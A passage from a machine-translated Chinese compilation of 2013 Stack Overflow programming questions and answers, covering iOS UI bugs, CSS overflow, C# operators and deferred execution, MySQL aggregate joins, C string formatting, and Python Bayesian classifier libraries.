        if(typedFormatter == null)
            return default(T);

        return typedFormatter.Format(entity);
    }
} 
```

通过控制器等的所有接线工作正常。我可以看到所有的注册和所有。但是从我到达方法的第一行的那一刻起，我得到了 EntryPointNotFoundException。

最奇怪的是，在方法的第一行设置断点并通过 Visual Studio 的监视窗口设置格式化程序字段并跳过该步骤时一切正常。

当我尝试在此方法之外解决时，在设置 DependencyResolver 之后它也可以工作：

```
DependencyResolver.SetResolver(new AutofacDependencyResolver(container));
var iindex = DependencyResolver.Current.GetService<IIndex<Type, IFormatter>>();
var test = (ITypedFormatter<SomeClass>) iindex[typeof (SomeClass)]; 
```

**我在上面看到的与正在运行的应用程序之间的唯一区别是该服务是从System.Web.Script.Serialization.JavaScriptSerializer().Serialize(model)**方法的内部执行路径中调用的。我也尝试过**NewtonSoft.Json.JsonSerializer**但没有运气。

我真的对这个感到困惑。

# uiview - 嵌入式 SegmentControl 无法响应触摸

> ID：14916324
> 
> 赞同：1
> 
> 时间：2013-02-16T23:31:52.597
> 
> 标签：uiview, ios6, tableview, uisegmentedcontrol

我已经解决了 SegmentControl 没有随着我的表格视图滚动的问题。我通过将控件嵌入到我的表格视图中来做到这一点，如下所示：

```
UIView *headerView = [[UIView alloc] init ];
        [headerView addSubview:resultsSegment];
        self.tableView.tableHeaderView = headerView; 
```

这很好用......

**但现在我不能点击段控制**。现在它是嵌入式的，这是否意味着就用户触摸而言，它本质上是在 TableView 的后面？

关于如何使 SegmentControl 再次“可点击”的任何想法？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:47:42.847

段控件不在 tableView 后面。它在 tableView 上。

要使segmentControl 再次可点击，您需要设置所有segmentControl 属性。这是来自网络的一些示例代码。

```
NSArray *itemArray = [NSArray arrayWithObjects: @"One", @"Two", @"Three", nil];
UISegmentedControl *segmentedControl = [[UISegmentedControl alloc] initWithItems:itemArray];
segmentedControl.frame = CGRectMake(35, 200, 250, 50);
segmentedControl.segmentedControlStyle = UISegmentedControlStylePlain;
segmentedControl.selectedSegmentIndex = 1;
[segmentedControl addTarget:self
                     action:@selector(pickOne:)
           forControlEvents:UIControlEventValueChanged];
[self.view addSubview:segmentedControl]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T01:59:50.873

感谢@eddieios，我确实解决了问题......通过删除我在原始答案中引用的大部分代码。

当我使用情节提要和属性检查器设置大部分参数时，我发现这是有效的代码：

```
 resultsSegment.frame = CGRectMake(50, 100, 250, 40);
   [self.tableView addSubview:resultsSegment]; 
```

第一行只是让段控制器的尺寸更大，第二行不仅允许我滚动并将段控制器保持在相同的位置，而且还可以使用它！

# css - 隐藏在 safari/opera 中的溢出失败

> ID：14916326
> 
> 赞同：1
> 
> 时间：2013-02-16T23:32:01.813
> 
> 标签：css

代码：http: [//jsfiddle.net/B6DsF/15/](http://jsfiddle.net/B6DsF/15/)

我已经敲了几个小时，空手而归。在 safari/opera 中隐藏溢出失败，在 chrome/ff/ie 中工作。从包装器中删除相对位置使其在 safari 中工作，但在歌剧中仍然失败。任何帮助是极大的赞赏。

**HTML：**

```
<div class="folio-wrap" style="background-image:url('http://www.gifszone.com/content/background/color_beige/color_beige_0.jpg')"> <a href="#" title="Text Here" class="folio-text">Text Here</a> 
```

**CSS**

```
div.folio-wrap {
width: 136px;
height: 136px;
display: block;
top: 0;
margin: 0;
padding: 0;
position: relative !important;
overflow: hidden !important;
text-align: center;
background-repeat: no-repeat;
background-position: center center;
border: 2px #3b3b3b solid;
-moz-border-radius: 70px;
-webkit-border-radius: 70px;
-ms-border-radius: 70px;
border-radius: 70px;
-moz-box-shadow: 0 0 12px rgba(0, 0, 0, 0.85);
-webkit-box-shadow: 0 0 12px rgba(0, 0, 0, 0.85);
box-shadow: 0 0 12px rgba(0, 0, 0, 0.85);
-moz-filter: sepia(0.8) opacity(0.25);
-webkit-filter: sepia(0.8) opacity(0.25);
-ms-filter: sepia(0.25) opacity(0.3);
filter: sepia(0.8) opacity(0.25);
-moz-transition: top 0.3s ease, -moz-filter 0.8s ease, filter 0.8s ease, opacity 0.8s ease, border 0.5s ease;
-webkit-transition: top 0.3s ease, -webkit-filter 0.8s ease, filter 0.8s ease, opacity 0.8s ease, border 0.5s ease;
-ms-transition: top 0.3s ease, -ms-filter 0.8s ease, filter 0.8s ease, opacity 0.8s ease, border 0.5s ease;
transition: top 0.3s ease, -moz-filter 0.8s ease, -webkit-filter 0.8s ease, -ms-filter 0.8s ease, filter 0.8s ease, opacity 0.8s ease, border 0.5s ease;
}

div.folio-wrap:hover {
top: -4px;
border: 2px #6b6b6b solid;
-moz-filter: sepia(0) opacity(1);
-webkit-filter: sepia(0) opacity(1);
-ms-filter: sepia(0) opacity(1);
filter: sepia(0) opacity(1);
}

div.folio-wrap > a.folio-text {
width: 128px;
height: 50px;
display: block;
margin: 80px auto 0 auto;
padding: 3px;
font-size: 10px;
font-weight: bold;
color: #f0f0f0 !important;
text-shadow: 0px 0px 2px rgba(0, 0, 0, 0.8);
background: #ababab;
background: -moz-linear-gradient(top, rgb(90, 90, 90) 0%, rgb(255, 255, 255) 100%);
background: -webkit-linear-gradient(top, rgb(90, 90, 90) 0%, rgb(255, 255, 255) 100%);
background: -ms-linear-gradient(top, rgb(90, 90, 90) 0%, rgb(255, 255, 255) 100%);
background: linear-gradient(top, rgb(90, 90, 90) 0%, rgb(255, 255, 255) 100%);
border-top: 1px solid #6b6b6b;
-moz-transition: all 0.3s ease;
-webkit-transition: all 0.3s ease;
-ms-transition: all 0.3s ease;
transition: all 0.3s ease;
}

div.folio-wrap > a.folio-text:hover {
    color: #2b2b2b !important;
    text-shadow: 0px 0px 2px rgba(255, 255, 255, 1);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-25T23:51:01.333

您需要更改位置：相对于静态。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-30T17:59:43.570

在 Safari 上溢出：除非您像这样使用 display: inline-table，否则隐藏不会正确呈现：

```
div.folio-wrap {
    display: inline-table;
    overflow: hidden !important;
} 
```

# delphi - 找出CPU的当前频率

> ID：14916327
> 
> 赞同：2
> 
> 时间：2013-02-16T23:32:11.453
> 
> 标签：delphi, winapi, visual-c++

Windows 8 任务管理器显示 CPU 的当前（不是最大）频率（例如 1.2 GHz）。有没有办法通过 Windows API 获得这个频率？最好使用 Delphi 或 Visual C++。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T02:02:09.540

我会研究 WMI，特别`CurrentClockSpeed`是类的属性`Win32_Processor`。

[MSDN 链接](http://msdn.microsoft.com/en-us/library/windows/desktop/aa394373%28v=vs.85%29.aspx)

# c# - 70-511 考试练习计算器

> ID：14916329
> 
> 赞同：0
> 
> 时间：2013-02-16T23:32:44.903
> 
> 标签：c#, wpf

我正在学习参加 70-511 考试，在第 1 章中建议的做法是：构建一个计算器程序，该程序使用 UniformGrid 控件进行数字按钮布局，并使用工具栏进行功能键布局，将两者托管在一个网格中。

我添加了以下统一网格，但如何添加带有 Enter、+ 和 - 按钮的工具栏？

```
<UniformGrid Name="calculatorGrid" Rows="3" Columns="3">
        <Button Content="1" Margin="2" />
        <Button Content="2" Margin="2" />
        <Button Content="3" Margin="2" />
        <Button Content="4" Margin="2" />
        <Button Content="5" Margin="2" />
        <Button Content="6" Margin="2" />
        <Button Content="7" Margin="2" />
        <Button Content="8" Margin="2" />
        <Button Content="9" Margin="2" />
</UniformGrid> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:39:34.683

像这样的东西：

```
<Grid>
    <Grid.RowDefinitions>
        <RowDefinition Height="Auto"/>
        <RowDefinition />
    </Grid.RowDefinitions>
    <ToolBarTray Grid.Row="0" Background="White">
        <ToolBar Band="1" BandIndex="1">
            <Button Content="Enter" />
            <Button Content="Add" />
            <Button Content="Delete" />
        </ToolBar>
    </ToolBarTray>
    <UniformGrid Name="calculatorGrid" Grid.Row="1" Rows="3" Columns="3">
        <Button Content="1" Margin="2" />
        <Button Content="2" Margin="2" />
        <Button Content="3" Margin="2" />
        <Button Content="4" Margin="2" />
        <Button Content="5" Margin="2" />
        <Button Content="6" Margin="2" />
        <Button Content="7" Margin="2" />
        <Button Content="8" Margin="2" />
        <Button Content="9" Margin="2" />
    </UniformGrid>
</Grid> 
```

尽管您可能希望为工具栏按钮提供图像。

# ios - 如何在使用 ARC 时调试 EXC_BAD_ACCESS 代码 = 2

> ID：14916332
> 
> 赞同：7
> 
> 时间：2013-02-16T23:33:22.157
> 
> 标签：ios, xcode, debugging, nszombie

我在这里看到很多关于如何解决 EXC_BAD_ACCESS 代码 = 2 的线程，并且共识似乎是我正在尝试访问我的数组，或者在我已经发布它之后访问我的数组中的一个对象。我看到大多数时候解决方案似乎是他们的代码中有太多 [release theObject]。我的问题是我没有任何发布电话，因为我使用的是 ARC。

所以我的问题是我如何从这一点上自己调试这个。如果有帮助，我可以发布代码，但我认为作为第一步，我只想帮助我下一步应该做什么以及如何去做。

我发现很多线程似乎都说我应该打开 NSZombiesEnabled 来帮助找到问题的根源。

在启用 Zombies 之前，我的应用程序将完全没有错误或警告地构建和运行。但是，一旦您在模拟器中触摸一个按钮，它就会崩溃。

打开 Zombies 后，应用程序仍然可以构建和运行，没有错误，但现在一出现模拟器就崩溃，现在 XCode 现在切换到 Tread 1 下的 Debug Navigator，列出了超过 100,000 个条目，每个条目都单击on 在主窗口中显示一些东西，我不知道这是什么意思。

那么，现在我该怎么办？我打开了 Zombies，然后再次运行，我在屏幕上看到一堆东西，但我真的不知道如何做出正面或反面。我试图发布屏幕截图，但我还没有权限这样做。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-02-17T21:39:10.623

我查看了您的源代码并发现了问题。您试图在延迟加载过程中将`numberOfMatchingCards`属性设置为 on ，从而创建了一个无限循环。您将尝试加载新游戏，因为在调用 setter 时您还没有完成游戏的实例化。只是改变`self.game``game``self.game.numberOfMatchingCards`

```
- (IBAction)cardModeChanged:(UISegmentedControl *)sender {
    switch ([sender selectedSegmentIndex]) {
        case 0:
            self.game.numberOfMatchingCards = 2;
            break;
        case 1:
            self.game.numberOfMatchingCards = 3;
            break;
        default:
            self.game.numberOfMatchingCards = 2;
            break;
    }
} 
```

到

```
- (IBAction)cardModeChanged:(UISegmentedControl *)sender {
    switch ([sender selectedSegmentIndex]) {
        case 0:
            _game.numberOfMatchingCards = 2;
            break;
        case 1:
            _game.numberOfMatchingCards = 3;
            break;
        default:
            _game.numberOfMatchingCards = 2;
            break;
    }
} 
```

我不确定这是否会解决您的错误访问问题，但这是调试导航器中出现许多条目的原因。如果您在修复此问题后仍然遇到错误的访问问题，请告诉我。重要的是要记住，即使您使用的是 ARC，对象仍然会被释放（当它们的引用计数降至零时）。

# android - 带有以太网屏蔽 + android 的 arduino

> ID：14916333
> 
> 赞同：1
> 
> 时间：2013-02-16T23:33:31.340
> 
> 标签：android, arduino

使用以太网屏蔽启用热点时，是否可以将 arduino 从 android 连接到 3G 网络？
如果是，请告诉我如何，如果不是，除了使用蓝牙或 USB 数据线之外，我还能怎么做才能将 arduino 与 Android 手机连接？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:55:53.723

当您在安卓设备上启用“热点”时，它会创建一个其他设备可以连接的 wifi 网络。然后这些设备可以通过手机访问 3G 网络。

如果您所指的以太网屏蔽具有 Wifi 功能，那么是的，这是可能的。我知道 arduino 确实存在 Wifi 防护罩，但你不能只使用任何旧的以太网防护罩。

# phpunit - Zend Studio 10：关于 PHPUnit_Framework_TestCase 扩展的新 PHPUnit 测试用例错误

> ID：14916334
> 
> 赞同：2
> 
> 时间：2013-02-16T23:34:00.410
> 
> 标签：phpunit, zend-studio

我试图在 Zend Studio 中设置一些 PHPUnit 测试用例，但被困在“新 PHPUnit 测试用例”表单上。我得到的错误是：

```
There are several elements with the name 'PHPUnit_Framework_TestCase' in project 'espnova'. 
Click 'Browse...' to choose one 
```

当我浏览时，我只有一个 PHPUnit_Framework_TestCase 可供选择。在下图中，您可以看到我正在谈论的“新 PHPUnit 测试用例”表单。

![新的 PHPUnit 测试用例表单](../Images/0aa995965be5ebedd8b04d054e215977.png)

我认为超类值是给我错误的值，所以我单击浏览，当我搜索 PHPUnit_Framework_TestCase 时得到这个：

![元素选择表](../Images/7b6bec8cfbaf599ded1380dd5d876b07.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-18T04:53:41.910

对构建路径中包含的所有目录进行代码搜索。如果您包含一个 PEAR 库并且 PHPUnit 包在您的项目中，那么 Zend-studio 将不知道选择哪一个。

# actionscript-3 - Flex 是否支持在客户端计算机上写入文件

> ID：14916335
> 
> 赞同：0
> 
> 时间：2013-02-16T23:34:06.573
> 
> 标签：actionscript-3, apache-flex

[我想我在这里](http://blog.barncar.com/?p=3)找到了一些使用 FileStream 的例子。但那是针对 AIR 应用程序的，我尝试了 FileStream，它似乎不适用于我的项目。我可以使用这个还是需要导入额外的库？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:37:46.413

Flex 是一个可以为两种不同的运行时（AIR 或 Flash）部署的框架。如果您正在部署浏览器应用程序，您将无法使用 FileStream，因为它仅适用于 AIR。不过，您可以使用 FileReference（它将打开一个文件保存窗口并允许用户选择下载文件的位置）。

# c# - 这段代码用“？”表示什么？和 ”？？” 意思是？

> ID：14916336
> 
> 赞同：1
> 
> 时间：2013-02-16T23:34:27.150
> 
> 标签：c#, asp.net-mvc, syntax, operators

这个语法是什么意思？当我通过这段代码来时，我目前正在编写 c# 4.0。

```
_data = (SerializationHelper.Deserialize(Request.Form[_dataKey])
             ? TempData[_dataKey] ?? new ProfileData ()) as ProfileData; 
```

如果我要写它 i IF 语句，那会怎么样？

编译器给了我一个错误，因为我没有写 : 以及需要更多的东西吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-16T23:36:18.277

?? 表示如果它为空，则使用其他值。例如

```
var name = somevalue ?? "Default Name"; 
```

如果`somevalue`为空，它将分配值“默认名称”

还有单？是一个三元运算符，基本上你可以这样使用它：

```
var example = (conditional statement here) ? value_if_true : value_if_false; 
```

但是，当我正确查看时，您的代码似乎没有遵循三元运算符的正确语法，正如 Corey 所说，您可能错过了 ? 关了？？？。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-16T23:41:08.003

看起来你错过了`?`那里。我怀疑它应该是这样的：

```
_data = (SerializationHelper.Deserialize(Request.Form[_dataKey])
            ?? TempData[_dataKey]
            ?? new ProfileData()
        ) as ProfileData; 
```

在 C# 中，该操作`A ?? B`直接等同于`(A == null ? B : A)`，或者`if (A == null) return B; return A;`如果您愿意。

所以你上面的陈述相当于：

```
object tmp = SerializationHelper.Deserialize(Request.Form[_dataKey]);
if (tmp == null)
{
    tmp = TempData[_dataKey];
    if (tmp == null)
        _tmp = new ProfileData();
}
_data = tmp as ProfileData; 
```

# javascript - Javascript比较图像

> ID：14916338
> 
> 赞同：0
> 
> 时间：2013-02-16T23:34:33.217
> 
> 标签：javascript, jquery, image, google-chrome

我需要将图像与各种图像进行比较，如果它们相等则做一些事情（我不需要任何图像识别，我只需要比较两个 100% 完全相等的图像），好吧，通过在 stackoverflow 上搜索我得出结论我最好的选择是将我的图像编码为base64，然后将字符串与另一个字符串进行比较。

我需要将一张图片与另一张图片进行比较，然后是另一张图片，然后是另一张图片等等，只要找到完美匹配就停止。我的计划是将每64个字符串存储在一个数组中，然后比较每个项目的目标图像，这个计划很好，理论上，但是让我担心的是，字符串的长度是852754个字符，这意味着它会非常，非常慢。有没有其他方法可以做到这一点？

我什至愿意将图像保存在我的计算机中，如果这有帮助的话，大约有 200 或 300 个，并没有那么多。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:40:21.253

这可以通过使用类似[MD5 implementation](http://pajhome.org.uk/crypt/md5/)的方式对字符串进行哈希处理（当然，考虑到 852754 长度的字符串，这里的熵可能是一个问题） 。您还可以想象使用应该更快的校验和（类似于[crc32 函数）。](http://www.webtoolkit.info/javascript-crc32.html)

使用您最喜欢的方法生成散列，并在生成一对之后，简单地比较散列（这会快得多）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:41:01.730

这就是我们有单向哈希算法的原因！您应该找到一个库来散列图像数据（例如 md5）。您可以轻松存储这些并快速比较。

当你有一个 md5 匹配时，你可以比较数据以确定（有可能但不太可能有冲突给出错误匹配）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T23:41:56.413

如果我很好地理解了您的问题：您可以在元素上使用`getBase64Image()`方法`var myimage = new Image()`

# mysql - MySQL从一张表中选择所有内容，并从另外两张表中选择总和

> ID：14916341
> 
> 赞同：1
> 
> 时间：2013-02-16T23:34:50.427
> 
> 标签：mysql

我有 3 张桌子

发票：身份证，客户

服务：invioce_id，价格

付款：invoice_id，金额

我想为每张发票选择所有服务价格为 amountDue 和任何付款金额为 amountPaid 的发票。

因此，例如，如果我有以下行：

发票

```
id = 1, client = 232
id = 2, client = 535 
```

服务

```
invoice_id = 1, price = 5.00
invoice_id = 1, price = 10.00
invoice_id = 2, price = 20.00 
```

付款

```
invoice_id = 1, amount = 7.00
invoice_id = 2, amount = 12.00
invoice_id = 2, amount = 8.00 
```

我希望所有发票行的结果查询类似于：

发票

```
id = 1, client = 232, amountDue = 15.00, amountPaid = 7.00
id = 2, client = 535, amountDue = 20.00, amountPaid = 20.00 
```

我有一个这样的查询：

```
SELECT invoices.*, 
sum(services.price) AS amountDue, 
sum(payments.amount) AS amountPaid 
FROM invoices 
LEFT JOIN services ON services.invoice = invoices.id 
LEFT JOIN payments ON invoices.id = payments.invoice 
GROUP BY invoices.id 
```

但是得到的金额被乘以每张发票的服务数量。

有没有办法通过一个查询来提取所有数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:47:42.087

您有两个子表，它们在各自的连接中返回了不同的行数。如果您在没有分组/求和的情况下运行查询，您最终会得到：

```
+------+-----------+-------+-----------+--------+
| id   | serviceid | price | paymentid | amount |
+------+-----------+-------+-----------+--------+
|    1 |         1 |  5.00 |         1 |   7.00 |
|    1 |         1 | 10.00 |         1 |   7.00 |
|    2 |         2 | 20.00 |         2 |  12.00 |
|    2 |         2 | 20.00 |         2 |   8.00 |
+------+-----------+-------+-----------+--------+ 
```

请注意发票 #1 的付款金额 $7 和发票 #2 的服务价格是如何重复的。MySQL 试图通过从具有较少行的表中复制值来填补查询结构产生的“漏洞”。

要使这种查询起作用，您需要使用相关子查询，以便每个子查询可以进行自己的求和，而不受其他表的行数限制：

```
select invoices.id,
   (select sum(price) from services where services.iid = invoices.id ) AS service_price,
   (select sum(amount) from payments where payments.iid = invoices.id) AS payment_amount
FROM invoices; 
```

产生

```
+------+---------------+----------------+
| id   | service_price | payment_amount |
+------+---------------+----------------+
|    1 |         15.00 |           7.00 |
|    2 |         20.00 |          20.00 |
+------+---------------+----------------+ 
```

# c# - ForEach 循环不改变类的属性

> ID：14916347
> 
> 赞同：6
> 
> 时间：2013-02-16T23:35:32.440
> 
> 标签：c#, foreach, windows-store-apps, ienumerator

我已经看到了一些关于此的问题，并进行了一些研究。

我的理解是，当您在 IEnumerable 上运行 foreach 时：如果 T 是引用类型（例如类），您应该能够从循环中修改对象的属性。如果 T 是值类型（例如 Struct），这将不起作用，因为迭代变量将是本地副本。

我正在使用以下代码开发 Windows Store 应用程序：

我的课：

```
public class WebResult
{
    public string Id { get; set; }
    public string Title { get; set; }
    public string Description { get; set; }
    public string DisplayUrl { get; set; }
    public string Url { get; set; }
    public string TileColor
    {
        get
        {
            string[] colorArray = { "FFA200FF", "FFFF0097", "FF00ABA9", "FF8CBF26",
            "FFA05000", "FFE671B8", "FFF09609", "FF1BA1E2", "FFE51400", "FF339933" };
            Random random = new Random();
            int num = random.Next(0, (colorArray.Length - 1));
            return "#" + colorArray[num];
        }
    }
    public string Keywords { get; set; }
} 
```

编码：

```
IEnumerable<WebResult> results = from r in doc.Descendants(xmlnsm + "properties")
                                 select new WebResult
                                 {
                                     Id = r.Element(xmlns + "ID").Value,
                                     Title = r.Element(xmlns + "Title").Value,
                                     Description = r.Element(xmlns +
                                                       "Description").Value,
                                     DisplayUrl = r.Element(xmlns + 
                                                      "DisplayUrl").Value,
                                     Url = r.Element(xmlns + "Url").Value,
                                     Keywords = "Setting the keywords here"
                                 };

foreach (WebResult result in results)
{
    result.Keywords = "These, are, my, keywords";
}

if (control is GridView)
{
    (control as GridView).ItemsSource = results;
} 
```

显示结果后，“关键字”属性为“在此处设置关键字”。如果我在 foreach 循环中放置一个断点，我可以看到结果对象没有被修改......

关于发生了什么的任何想法？我只是错过了一些明显的东西吗？IEnumerable 在 .NET For Windows Store Apps 中的行为是否不同？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-16T23:38:07.963

这被称为[`deferred execution`](http://msdn.microsoft.com/en-us/library/bb397906.aspx); `results`是每次迭代时都会执行的查询。在您的情况下，它被评估了两次，一次在 for 循环中，第二次在数据绑定时。

您可以通过执行以下操作来验证这一点

```
var results2 = results.ToList();

foreach (WebResult result in results2)
{
    result.Keywords = "These, are, my, keywords";
}

if (control is GridView)
{
    (control as GridView).ItemsSource = results2;
} 
```

您应该看到您的更改仍然存在。

# c - 将 int 和 char 转换为字符串

> ID：14916349
> 
> 赞同：0
> 
> 时间：2013-02-16T23:36:06.400
> 
> 标签：c, string, string-formatting

我有 int`x`和 char `c`。我想创建一个名为`str`“x c”的新字符串；所以int，空格和char。

例如：

```
x = 5, c = 'k'

//concatenate int and char with a space in between. 
```

所以该行将`printf("%s", str)`打印：

```
5 k 
```

我如何在 C 代码中执行此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:40:01.923

在假设缓冲区总是足够大的情况下使用[`sprintf`](http://linux.die.net/man/3/sprintf)或避免构建代码的安全性：[`snprintf`](http://linux.die.net/man/3/snprintf)

```
char str[100];
sprintf(str, 100, "%d %c", x, c); 
```

但是，如果 will 的唯一目的是`str`将其用于 with `printf`，那么`printf`直接：

```
printf("%d %c", x, c); 
```

...只是不要使用[`itoa`](http://www.cplusplus.com/reference/cstdlib/itoa/)，因为*“此函数* ***未*** *在 ANSI-C 中定义，* ***也不*** *是 C++ 的一部分”*

这些问题也可能对您有所帮助：
[How to convert an int to string in C](https://stackoverflow.com/questions/8257714/how-to-convert-an-int-to-string-in-c)
[Converting int to string in c](https://stackoverflow.com/questions/5242524/converting-int-to-string-in-c)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T23:39:40.970

```
char tmp[32]={0x0};
sprintf(tmp, "%d %c", x, c);
printf("%s\n", tmp); 
```

或者

```
printf("%d %c\n", x, c); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-16T23:40:09.810

sprintf() 可以做你想做的事：

```
sprintf(str, "%d %c", x, c); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-16T23:41:02.857

由于您想将信息打印出来，因此（我可以看到）没有理由首先将数据转换为字符串。只需打印出来：

```
printf("%d %c", x, c); 
```

# python - 在 python 中学习和使用增强的贝叶斯分类器

> ID：14916351
> 
> 赞同：16
> 
> 时间：2013-02-16T23:36:12.013
> 
> 标签：python, classification, bayesian-networks

我正在尝试在（最好是python 3，但python 2也可以接受）中使用森林（或树）增强贝叶斯分类器（[原始介绍](http://www.cse.huji.ac.il/~nir/Papers/FrG1.pdf)，[学习](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.55.7726&rep=rep1&type=pdf)`python`） ，首先学习它（结构和参数学习）然后使用它用于离散分类并获得具有缺失数据的那些特征的概率。（这就是为什么只是离散分类，甚至是好的朴素分类器对我来说不是很有用。）

我的数据进来的方式，我喜欢从不完整的数据中使用增量学习，但我什至在文献中都没有发现任何可以同时做这两种方法的东西，所以任何做结构和参数学习和推理的东西都是好的回答。

似乎有一些非常独立且未维护的python包大致朝这个方向发展，但我没有看到任何最近的东西（例如，我希望`pandas`用于这些计算是合理的，但`OpenBayes`几乎没有使用`numpy`） ，而我所见过的任何东西似乎都完全没有增强分类器。

那么，我应该从哪里节省一些实现森林增强贝叶斯分类器的工作呢？在 python 类中是否有一个很好的 Pearl 消息传递算法的实现，或者这对于增强的贝叶斯分类器是否不合适？是否有一个可读的面向对象的实现，用于学习和推断其他语言的 TAN 贝叶斯分类器，可以翻译成 python？

* * *

我知道但发现不合适的现有软件包是

*   [`milk`](http://pythonhosted.org/milk/)，它确实支持分类，但不支持贝叶斯分类器（我肯定需要分类和未指定特征的概率）
*   [`pebl`](https://github.com/abhik/pebl)，它只做结构学习
*   [`scikit-learn`](http://scikit-learn.org/stable/modules/naive_bayes.html)，它只学习朴素贝叶斯分类器
*   `OpenBayes``numarray`，自从有人将它移植到`numpy`并且文档可以忽略不计以来，它几乎没有改变。
*   [`libpgm`](http://pythonhosted.org/libpgm/)，它声称支持一组甚至不同的东西。根据主要文档，它进行推理、结构和参数学习。除了似乎没有任何精确推断的方法。
*   [Reverend](http://sourceforge.net/projects/reverend/)声称自己是“贝叶斯分类器”，文档可以忽略不计，通过查看源代码，我得出的结论是，根据[Robinson](http://www.linuxjournal.com/article/6467?page=0,0)和类似的方法，它主要是垃圾邮件分类器，而不是贝叶斯分类器。
*   [eBay 的`bayesian`Belief Networks](https://github.com/eBay/bayesian-belief-networks)允许构建通用贝叶斯网络并对其进行推理（精确和近似），这意味着它可以用于构建 TAN，但其中没有学习算法，以及 BN 是从函数构建的方式意味着实现参数学习比假设的不同实现更困难。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-11-26T10:20:17.397

恐怕没有开箱即用的`Random Naive Bayes`分类器实现（我不知道），因为它仍然是学术问题。以下论文介绍了结合 RF 和 NB 分类器的方法（在付费墙后面）： http: [//link.springer.com/chapter/10.1007%2F978-3-540-74469-6_35](http://link.springer.com/chapter/10.1007%2F978-3-540-74469-6_35)

我认为您应该坚持使用`scikit-learn`，它是 Python 最流行的统计模块之一（与 一起`NLTK`），并且有很好的文档记录。

`scikit-learn`有一个随机森林模块：[http](http://scikit-learn.org/stable/modules/ensemble.html#forests-of-randomized-trees) ://scikit-learn.org/stable/modules/ensemble.html#forests-of-randomized-trees 。有一个子模块（我坚持不确定性）**可**用于流向 NB 分类器：

> RandomTreesEmbedding 实现了数据的无监督转换。RandomTreesEmbedding 使用完全随机树的森林，通过数据点最终所在的叶子的索引对数据进行编码。然后，该索引以 K 之一的方式编码，从而产生高维、稀疏的二进制编码。这种编码可以非常有效地计算，然后可以用作其他学习任务的基础。选择树的数量和每棵树的最大深度可以影响代码的大小和稀疏性。对于集成中的每一棵树，编码包含一个条目。编码的大小最多为 n_estimators * 2 ** max_depth，森林中的最大叶子数。
> 
> 由于相邻数据点更有可能位于树的同一叶中，因此转换执行隐式的非参数密度估计。

当然还有朴素贝叶斯分类器的核心实现，可以增量使用：[http ://scikit-learn.org/stable/modules/naive_bayes.html](http://scikit-learn.org/stable/modules/naive_bayes.html)

> 离散朴素贝叶斯模型可用于解决完整训练集可能无法放入内存的大规模文本分类问题。为了处理这种情况，MultinomialNB 和 BernoulliNB 都公开了一个 partial_fit 方法，该方法可以与其他分类器一起增量使用，如文本文档的核心分类中所示。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-07-15T01:22:31.793

对于如何使用 libpgm 进行精确推断，我同样感到困惑。然而，事实证明这是可能的。例如（[来自 libpgm 文档](http://pythonhosted.org/libpgm/tablecpdfactorization.html?highlight=condprobve#libpgm.tablecpdfactorization.TableCPDFactorization.condprobve)），

```
import json

from libpgm.graphskeleton import GraphSkeleton
from libpgm.nodedata import NodeData
from libpgm.discretebayesiannetwork import DiscreteBayesianNetwork
from libpgm.tablecpdfactorization import TableCPDFactorization

# load nodedata and graphskeleton
nd = NodeData()
skel = GraphSkeleton()
nd.load("../tests/unittestdict.txt")
skel.load("../tests/unittestdict.txt")

# toporder graph skeleton
skel.toporder()

# load evidence
evidence = dict(Letter='weak')
query = dict(Grade='A')

# load bayesian network
bn = DiscreteBayesianNetwork(skel, nd)

# load factorization
fn = TableCPDFactorization(bn)

# calculate probability distribution
result = fn.condprobve(query, evidence)

# output
print json.dumps(result.vals, indent=2)
print json.dumps(result.scope, indent=2)
print json.dumps(result.card, indent=2)
print json.dumps(result.stride, indent=2) 
```

为了使示例正常工作，[这里是数据文件](http://pythonhosted.org/libpgm/unittestdict.html)（我替换`None`为`null`并保存为`.json`）。

我知道这对游戏来说已经很晚了，但这是我在寻找使用 Python 进行贝叶斯网络的资源时发现的最好的帖子。我想我会回答以防其他人正在寻找这个。（对不起，本来会发表评论的，但刚刚注册了 SO 来回答这个问题，并且代表还不够高。）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-03-12T01:04:20.113

R`bnlearn`实现了朴素贝叶斯和树增强朴素贝叶斯分类器。您可以使用 rpy2 将这些移植到 Python。

[http://cran.r-project.org/web/packages/bnlearn/bnlearn.pdf](http://cran.r-project.org/web/packages/bnlearn/bnlearn.pdf)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-12-02T12:20:36.143

好像还没有这种东西。

目前最接近的似乎是 eBay 对 Belief Networks 的开源实现[`bayesian`](https://github.com/eBay/bayesian-belief-networks)。它实现了推理（两种精确方式和近似方式），这意味着它可以用于构建 TAN。可以在我的[`open20q`](https://github.com/Anaphory/open20q/blob/master/open20q_augmented.py)存储库中找到一个示例（目前仍然是一段丑陋的意大利面条代码）。

*   优点：
    *   有用。也就是说，我现在有了一个基于`bayesian`信念网络推理的 TAN 推理实现。
